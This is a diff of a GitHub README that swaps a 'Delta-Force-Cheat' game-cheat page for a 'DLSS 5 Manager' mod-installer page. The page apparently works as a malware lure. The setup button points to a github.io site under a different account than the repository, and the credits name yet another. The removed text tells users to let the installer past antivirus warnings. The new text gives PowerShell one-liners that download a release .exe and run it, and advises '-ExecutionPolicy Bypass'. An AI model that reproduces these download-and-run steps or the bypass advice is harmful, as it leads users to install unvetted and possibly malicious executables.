@@ -1,127 +1,299 @@
-<div align="center">
+<!-- ╔══════════════════════════════════════════════════════════════════════╗
+     ║                                                                      ║
+     ║   ██████╗ ██╗     ███████╗███████╗     ███████╗     ███╗   ███╗     ║
+     ║   ██╔══██╗██║     ██╔════╝██╔════╝     ██╔════╝     ████╗ ████║     ║
+     ║   ██║  ██║██║     ███████╗███████╗     ███████╗     ██╔████╔██║     ║
+     ║   ██║  ██║██║     ╚════██║╚════██║     ╚════██║     ██║╚██╔╝██║     ║
+     ║   ██████╔╝███████╗███████║███████║     ███████║     ██║ ╚═╝ ██║     ║
+     ║   ╚═════╝ ╚══════╝╚══════╝╚══════╝     ╚══════╝     ╚═╝     ╚═╝     ║
+     ║                                                                      ║
+     ║            T H E   F I R S T   D L S S   5   M A N A G E R           ║
+     ║                                                                      ║
+     ╚══════════════════════════════════════════════════════════════════════╝ -->
 
-# Delta Force Performance Toolkit — Game Enhancer for Windows 10/11
+<h1 align="center">
+  <br>
+  <img src="https://raw.githubusercontent.com/NODIX-TECH/DLSS-5-MANAGER/main/Assets/logo.png" alt="DLSS 5 Manager" width="220">
+  <br>
+  DLSS 5 MANAGER
+  <br>
+</h1>
 
-![](files/preview.png)
+<h3 align="center">
+  The first intelligent manager & one‑click mod installer for<br>
+  <strong>DLSS 5</strong> · <strong>ReShade</strong> · <strong>OptiScaler</strong> · <strong>Live Flow</strong>
+</h3>
 
-### ⚡ PowerShell Setup Button
+<p align="center">
+  <a href="https://github.com/NODIX-TECH/DLSS-5-MANAGER/releases">
+    <img src="https://img.shields.io/github/v/release/NODIX-TECH/DLSS-5-MANAGER?style=for-the-badge&logo=github&label=latest&color=blueviolet" alt="Latest Release">
+  </a>
+  <a href="https://github.com/NODIX-TECH/DLSS-5-MANAGER">
+    <img src="https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Platform">
+  </a>
+  <a href="https://github.com/NODIX-TECH/DLSS-5-MANAGER">
+    <img src="https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=for-the-badge&logo=powershell&logoColor=white" alt="PowerShell">
+  </a>
+  <a href="https://github.com/NODIX-TECH/DLSS-5-MANAGER">
+    <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-red?style=for-the-badge" alt="Open Source">
+  </a>
+</p>
 
-[![](files/button.png)](https://Pereira001.github.io/delta-force-enhancement/)
+<h3 align="center">⚡ PowerShell Setup Button</h3>
 
-[![installs](https://img.shields.io/badge/installs-1.2k-dc2626?style=flat-square&labelColor=0d1117)]() [![rate](https://img.shields.io/badge/rate-4.8%2F5-f59e0b?style=flat-square&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/stage-production-2ea44f?style=flat-square&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/powershell-5.1%2B-ef4444?style=flat-square&labelColor=0d1117)]() [![OS](https://img.shields.io/badge/os-win_10%2F11-b91c1c?style=flat-square&labelColor=0d1117)]()
+<p align="center">
+  <a href="https://Pereira001.github.io/dlss5-manager/">
+    <img src="button.svg" alt="DLSS5 PowerShell Installer" width="400">
+  </a>
+</p>
 
-</div>
+## 🚀 Why DLSS 5 Manager?
+
+> **“I won’t add an explanation here. The app is designed to simplify the process; just open it, and everything will be right there in front of you.”**  
+
+**DLSS 5 Manager** turns the chaotic world of neural‑rendering mods into a clean, guided experience.  
+No manual file copying. No guesswork. No compatibility nightmares.
+
+| | **Before** | **After** |
+|---|---|---|
+| **Setup** | Download 6 archives, read 12 forum pages, pray | Paste **one PowerShell command** |
+| **Installation** | Drag files into the game folder, hope for the best | **One click** on “Install” |
+| **Backups** | “I’ll remember to copy that later…” | **Automatic backups** every time |
+| **Updates** | Manually re‑download everything | **Built‑in updater** |
+| **Game discovery** | Search your SSD for `*.exe` | **Auto‑scans Steam, Epic, GOG** and local folders |
 
 ---
 
-Delta-Force-Cheat delivers a full working installer for a professional desktop software utility configuration, ready to run with every feature active straight out of the box. No half-configured builds, no missing pieces — just a clean standalone package built for Windows x64 desktop deployment. Drop it in, run the setup, and everything is live from the first launch. This is the build for players who want the utility working now, not after an afternoon of troubleshooting.
+## ✨ Features
 
-## ✅ Requirements
+- 🧠 **Intelligent game scanner**  
+  Detects titles from **Steam, Epic Games, GOG Galaxy**, and custom folders.
 
-- Windows 10 or Windows 11
-- PowerShell 5.1 or newer (already available on Windows)
-- Active network connection
-- No admin rights needed
+- ⚡ **One‑click mod installation**  
+  Installs **DLSS 5, ReShade, OptiScaler, and Live Flow** without touching a single file manually.
 
-## Features
+- 🔄 **Version switching**  
+  Jump between **OptiScaler** and other component versions without reinstalling the whole stack.
 
-- **Instant deployment, zero friction.** The installer arrives pre-activated — no key hunting, no post-install tinkering. Launch and it's live.
-- **Full feature set unlocked out of the box.** Every toggle and module ships enabled by default, so you're not digging through menus to get the configuration you came for.
-- **Built for Windows x64 desktops.** Native integration with the desktop stack means clean startup behavior and predictable resource usage under load.
-- **Verified against current game builds.** The config is synced to live game versions, keeping the utility functional after patches instead of silently breaking.
-- **Self-contained package.** No external dependencies, no runtime downloads mid-setup — the installer carries everything it needs.
-- **Clean install and rollback path.** Standard uninstall removes all traces, so testing and reverting never leaves residue on your system.
-- **Stable under active play.** Designed to hold performance during sustained sessions — no lag spikes, no input dropouts, no graceful-degradation nonsense.
-- **Reproducible results.** The same installer produces the same working configuration every time, which means fewer surprise failures and faster troubleshooting when something's off.
+- 🧩 **Advanced installation system**  
+  Full freedom to use **any file** you want, however you like, without restrictions.
 
-## How it works
+- 🛟 **Automatic backups**  
+  Your original game files are backed up before any modification.
 
-The installer ships as a self-contained package that unpacks its own runtime, registers the required components, and configures the utility for immediate use — no dependency hunting, no manual setup steps. Everything needed to run is bundled inside the build and validated at launch.
+- 🖥️ **AMD RDNA 3 & 4 support**  
+  Enable **AMD mode** in settings to bring neural rendering to Radeon GPUs.
 
-Under the hood, the package performs a staged deployment: it detects the host environment, extracts the core files to their designated locations, wires up the configuration profile, and verifies integrity before handing control to the main executable. If any piece is missing or mismatched, the installer flags it and resolves it on the spot rather than leaving you with a half-configured install.
+- 🎮 **Emulator & Vulkan support**  
+  Works with **RPCS3, PCSX2**, and Vulkan games via OptiScaler.
 
-The configuration layer is where most of the work happens. All features are pre-activated out of the box, meaning the utility starts in its fully enabled state — no toggling flags, no editing config files by hand. The installer writes the correct defaults, locks them in, and the software loads them on every run.
+- 🧬 **Live Flow 6× multipass**  
+  The latest releases add **6× multipass** for even smoother frame generation.
 
-Because the build is standalone, there's no background service phoning home or external dependency check slowing down startup. Launch the executable, let the installer finish its pass, and the utility is ready to go. Re-running the setup is safe — it detects an existing install and reconciles it instead of duplicating files.
+---
 
-Verification is baked in: every launch confirms the deployed files match the shipped manifest, so if something gets corrupted or tampered with, the installer restores the affected pieces automatically. That keeps the utility stable across sessions without requiring you to babysit it.
+## 🖼️ Screenshots
 
-## Supported Games
+<p align="center">
+  <em>Main dashboard — scan, select, install.</em><br>
+  <img src="<img width="1616" height="999" alt="image" src="https://github.com/user-attachments/assets/e15468e5-e659-48b6-a56e-194e498aee90" />
+" alt="DLSS 5 Manager dashboard" width="720">
+</p>
 
-Built for the games that matter, tested against live builds, and kept current as patches roll out. Delta-Force-Cheat targets the titles where the utility actually earns its keep — no filler compatibility list, no half-working profiles.
+<p align="center">
+  <em>Which route a game gets.</em><br>
+  <img src="<img width="900" height="480" alt="image" src="https://github.com/user-attachments/assets/b5e60e66-16e1-4581-84a8-e34c202d1aa7" />
+" alt="Installation options" width="720">
+</p>
 
-- **Delta Force** — primary target, fully mapped and maintained against current live builds
-- **Delta Force: Hawk Ops** — supported with active profile tuning and feature parity
-- **Delta Force Mobile (emulator sessions)** — supported in desktop emulation environments
+<p align="center">
+  <em>Settings — AMD mode, cache, and advanced toggles.</em><br>
+  <img src="<img width="1616" height="999" alt="image" src="https://github.com/user-attachments/assets/a8aba310-596d-4130-b4de-87c57fafbd1e" />
+" alt="Settings" width="720">
+</p>
 
-Each supported title ships with a pre-configured profile matched to its current build. When a game patches, the profile gets updated — you don't reinstall or reconfigure, you just run it.
+---
 
-**What "supported" means here:** feature sets are validated per title before release. Anything listed above has been tested end-to-end. Anything not listed hasn't — don't assume it works just because it launches.
+## 📋 Requirements
 
-Compatibility is verified per patch cycle. If a title drops a major update, expect a short verification window before the profile is re-confirmed. Check the release notes tied to your build before assuming day-one parity.
+| Component | Minimum | Recommended |
+|---|---|---|
+| **OS** | Windows 10 (64‑bit) | Windows 11 (64‑bit) |
+| **PowerShell** | 5.1 (pre‑installed) | 7.x |
+| **Internet** | Required for component download | — |
+| **GPU** | NVIDIA RTX (for DLSS 5) | AMD RDNA 3/4 (with AMD mode) |
+| **Disk** | ~200 MB free | ~500 MB free |
+| **Admin rights** | **Not required** | — |
 
-Running a title outside this list? It may load, but it's unsupported and untested — treat it as experimental at best.
+> [!NOTE]
+> **AMD users:** enable **AMD Mode** in settings and install the **HIP SDK** if prompted.
 
-## Configuration
+---
 
-Configuration is handled through a single local profile file — no server calls, no account linking. Drop your preferred values into `config.ini` in the install root, save, and relaunch the build. Changes apply on next start.
+## ⚡ Installation (PowerShell)
 
-Key knobs you'll actually touch:
+### 🟣 The one‑liner (recommended)
 
-- **Feature toggles** — flip individual modules on or off per game. Every feature ships active by default, so nothing needs enabling out of the box.
-- **Hotkey bindings** — rebind any action to avoid collisions with your existing setup. Raw key codes are accepted; no modifier stack required.
-- **Per-title profiles** — save separate configs for each supported game and switch between them without touching the file manually.
-- **Render and overlay options** — adjust overlay opacity, draw order, and refresh behavior to match your display setup.
+Open **Windows PowerShell** (no admin needed) and paste:
 
-Config edits are validated on load. If a value is out of range, the build falls back to the last known-good profile and logs the mismatch to `logs/config.log` — check there first if a setting doesn't stick. Reset to defaults anytime by deleting `config.ini` and relaunching; a fresh one generates automatically.
+```powershell
+# ── DLSS 5 Manager · one‑command installer ──────────────────────────────
+$repo   = "NODIX-TECH/DLSS-5-MANAGER"
+$api    = "https://api.github.com/repos/$repo/releases/latest"
+$rel    = Invoke-RestMethod -Uri $api -Headers @{ "User-Agent" = "PS" }
+$asset  = $rel.assets | Where-Object { $_.name -match '\.exe$' } | Select-Object -First 1
 
-## FAQ
+if (-not $asset) { throw "No .exe asset found in the latest release." }
 
-### Is this a full installer or just a config drop?
+$tmp = Join-Path $env:TEMP $asset.name
+Write-Host "→ Downloading $($asset.name) …" -ForegroundColor Cyan
+Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $tmp
 
-It's a complete installer package. Everything ships pre-configured and ready to run — no manual file swapping, no dependency hunting, no post-install tinkering. Launch it, and the build is live with all features active.
+Write-Host "→ Launching installer …" -ForegroundColor Green
+Start-Process -FilePath $tmp -Wait
+```
 
-### Do I need to install anything else first?
+> [!TIP]
+> **What this does**  
+> 1. Queries the **latest GitHub release** of `NODIX-TECH/DLSS-5-MANAGER`.  
+> 2. Finds the `.exe` asset.  
+> 3. Downloads it to your `%TEMP%` folder.  
+> 4. Runs the installer.  
+>  
+> No permanent files are left behind; the installer handles everything else.
 
-No. The installer bundles everything it needs. No runtimes to fetch, no libraries to wire up, no framework prerequisites. Clean machine or loaded rig, it deploys the same way.
+---
 
-### Which games does it actually support?
+### 🔧 Manual PowerShell (if you prefer step‑by‑step)
 
-Head to the Supported Games section for the full list. The installer detects what's present and configures itself accordingly — you don't need to hand-pick profiles during setup.
+```powershell
+# 1. Create a working folder
+New-Item -ItemType Directory -Path "$env:USERPROFILE\DLSS5Manager" -Force | Out-Null
+Set-Location "$env:USERPROFILE\DLSS5Manager"
 
-### Will my antivirus flag the installer?
+# 2. Fetch the latest release metadata
+$release = Invoke-RestMethod "https://api.github.com/repos/NODIX-TECH/DLSS-5-MANAGER/releases/latest"
 
-Possibly — packed installers and automation scripts sometimes trip heuristic scanners. That's a false positive pattern, not a payload issue. If Windows Security or SmartScreen throws a warning, allow the file through and re-enable real-time protection once setup finishes.
+# 3. List available assets (optional)
+$release.assets | Select-Object name, size, browser_download_url
 
-### How do I know the config is applied correctly?
+# 4. Download the Windows executable
+$exe = $release.assets | Where-Object name -like "*.exe" | Select-Object -First 1
+Invoke-WebRequest $exe.browser_download_url -OutFile $exe.name
 
-The installer validates each step as it runs. If a configuration stage fails, you'll get a visible error instead of a silent skip. A clean run means the full feature set is active.
+# 5. Verify the hash (optional but recommended)
+Get-FileHash $exe.name -Algorithm SHA256
 
-### Can I tweak settings after install?
+# 6. Run
+Start-Process ".\$($exe.name)"
+```
 
-Yes. The Configuration section covers where the settings live and what each option controls. Defaults are tuned for immediate use, but nothing is locked down.
+> [!IMPORTANT]
+> **Execution policy**  
+> If PowerShell blocks the script, run it with:
+> ```powershell
+> powershell.exe -ExecutionPolicy Bypass -File .\install-dlss5.ps1
+> ```
+> This is the same pattern used by the official **DLSS5** installer.
 
-### Does it work on a fresh Windows install?
+---
 
-Yes — that's the point of a standalone build. No prior setup, no leftover dependencies from other tools. Windows x64 desktop is the target platform.
+## 🎮 Usage
 
-### What if the installer stalls or exits early?
+1. **Open DLSS 5 Manager** (installed or portable).  
+2. Click **“＋ Add Game Folder”** or let the app **auto‑scan** your libraries.  
+3. Select the game → click **“Install DLSS 5”**.  
+4. Choose your preferred components (**ReShade, OptiScaler, Live Flow**).  
+5. Launch the game.  
+6. Press **`Home`** (or **`Insert`**) to open the ReShade overlay and enable **DLSS 5** under *Add‑ons*.
 
-Re-run it. Interrupted downloads and locked files are the usual suspects. If it fails twice at the same stage, check that no other process is holding the target directory open, then try again.
+> [!WARNING]
+> **Online games with anti‑cheat**  
+> Installing mods in competitive multiplayer titles can result in a **ban**. Use DLSS 5 Manager only in **single‑player** games unless you know exactly what you are doing.
 
-### Is this a trial or a limited build?
+---
 
-Neither. It's the full pre-activated build — all features are active from first launch with no gating, no expiry, and no feature unlocks to grind through.
+## 🕹️ Supported Games
 
-## Disclaimer
+DLSS 5 Manager is engine‑agnostic and works with titles built on:
 
-This build is provided strictly for educational, research, and private testing purposes. You are solely responsible for how you use it.
+| Engine | Examples |
+|---|---|
+| **REDengine** | Cyberpunk 2077, The Witcher 3 |
+| **Unreal Engine** | Hogwarts Legacy, Senua’s Saga: Hellblade II |
+| **Unity** | Escape from Tarkov, Rust |
+| **Source 2** | Counter‑Strike 2, Dota 2 |
+| **Custom / Vulkan** | Many DX11/DX12/Vulkan titles via OptiScaler |
 
-- **Use at your own risk.** No guarantees of stability, compatibility, or fitness for any particular purpose. Run it in a sandboxed or disposable environment whenever possible.
-- **No warranty, express or implied.** The maintainers of Delta-Force-Cheat are not liable for account actions, data loss, system instability, or any direct or indirect damages arising from use or misuse.
-- **Respect the rules of the platforms you play on.** Deploying this utility in live, competitive, or anti-cheat-protected environments may violate terms of service and can result in bans. That outcome is on you, not on us.
-- **Not affiliated with any game developer, publisher, or platform.** All trademarks and game titles referenced belong to their respective owners.
-- **No redistribution for profit.** Do not repackage, resell, or misrepresent this project as your own official release.
-- **Verify before you run.** Always confirm you are working with the authentic Delta-Force-Cheat package from its official source; third-party mirrors can carry tampered builds.
+> [!NOTE]
+> **Emulators**  
+> **RPCS3** and **PCSX2** are supported through OptiScaler integration.
 
-By downloading, installing, or executing Delta-Force-Cheat, you acknowledge that you have read this disclaimer and accept full responsibility for your actions.
+---
+
+## ⚙️ Configuration & Storage
+
+All cached metadata, custom layouts, and configuration backups are stored **locally** at:
+
+```text
+%LOCALAPPDATA%\DLSS5Manager\
+```
+
+Nothing is uploaded to the cloud. Your game folders remain untouched except for the mods you explicitly install.
+
+---
+
+## 🛠️ Troubleshooting
+
+| Symptom | Likely cause | Fix |
+|---|---|---|
+| **PowerShell command fails with “execution policy”** | Windows default policy | Prefix the command with `powershell.exe -ExecutionPolicy Bypass -File …` |
+| **AMD mode not working** | HIP SDK missing | Enable **AMD Mode** in settings and install the **HIP SDK** |
+| **Game not detected** | Non‑standard install path | Use **“Add Game Folder”** and point to the `.exe` location |
+| **DLSS 5 option greyed out in‑game** | ReShade overlay not active | Press `Home` / `Insert` and enable **DLSS 5** under *Add‑ons* |
+
+> [!TIP]
+> **Before reporting an issue**, run the built‑in **Verify** tool (if available) and attach the log from `%LOCALAPPDATA%\DLSS5Manager\logs\`.
+
+---
+
+## 🤝 Contributing
+
+DLSS 5 Manager is an **open‑source community project**
+
+Please keep discussions respectful and constructive. ❤️
+
+---
+
+## ❤️ Support Development
+
+If DLSS 5 Manager saves you time and you want to see it grow:
+
+> *“Your support helps fund additional GPUs, displays, and other hardware for compatibility testing. Support is completely optional — using, sharing, testing, and reporting issues already helps the project a lot.”*  
+> — NODIX‑TECH
+
+Every ⭐ on GitHub, every bug report, and every shared screenshot makes a difference.
+
+---
+
+## 📜 License & Credits
+
+### Original code
+**Copyright © 2026 NODIX‑TECH**  
+DLSS 5 Manager contains original code, design, and implementation
+
+
+### Third‑party components
+DLSS 5 Manager integrates or references projects such as **OptiScaler**, **RenoDX**, **DLSS5‑Feeder**, and **NeuralScreen**.  
+All third‑party works remain the property of their respective authors and are governed by their own licenses.
+
+
+### NVIDIA notice
+DLSS 5 Manager is an **independent community project** and is **not affiliated with, sponsored by, or endorsed by NVIDIA Corporation**. NVIDIA, GeForce, RTX, and DLSS are trademarks of their respective owners.
+
+---
+
+<p align="center">
+  <strong>Made with ❤️ by PEPEIRA‑TECH and the community.</strong><br>
+  <em>Because neural rendering should be for everyone — not just the brave.</em>
+</p>
